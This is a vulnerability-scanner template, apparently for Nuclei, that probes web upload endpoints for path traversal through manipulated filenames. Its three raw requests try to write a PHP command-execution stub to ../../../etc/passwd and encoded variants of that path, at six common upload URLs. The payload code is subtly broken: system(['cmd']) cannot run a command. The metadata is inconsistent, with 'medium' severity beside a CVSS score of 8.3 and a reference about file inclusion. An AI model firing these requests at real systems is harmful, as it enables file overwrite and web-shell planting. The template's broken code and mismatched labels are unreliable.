id: medium-upload-path-traversal-filename-manipulation

info:
  name: File Upload - Path Traversal via Filename Manipulation
  author: elite-red-team
  severity: medium
  description: |
    Detects file upload vulnerabilities allowing path traversal through filename manipulation.
    This template tests various encoding techniques and path traversal sequences in filenames.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 8.3
    cwe-id: CWE-22
  tags: fileupload,path-traversal,filename,directory-traversal

http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
        Content-Type: text/plain
        
        <?php system(['cmd']); ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="..%2F..%2F..%2Fetc%2Fpasswd"
        Content-Type: text/plain
        
        <?php system(['cmd']); ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="....//....//....//etc//passwd"
        Content-Type: text/plain
        
        <?php system(['cmd']); ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    payloads:
      path:
        - "{{BaseURL}}/upload"
        - "{{BaseURL}}/upload.php"
        - "{{BaseURL}}/fileupload"
        - "{{BaseURL}}/file/upload"
        - "{{BaseURL}}/admin/upload"
        - "{{BaseURL}}/user/upload"

    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 302

      - type: word
        words:
          - "upload"
          - "success"
          - "file"
          - "saved"
          - "uploaded"
        condition: or
        case-insensitive: true

      - type: word
        words:
          - "error"
          - "failed"
          - "invalid"
          - "not allowed"
          - "forbidden"
        condition: or
        case-insensitive: true
        negative: true
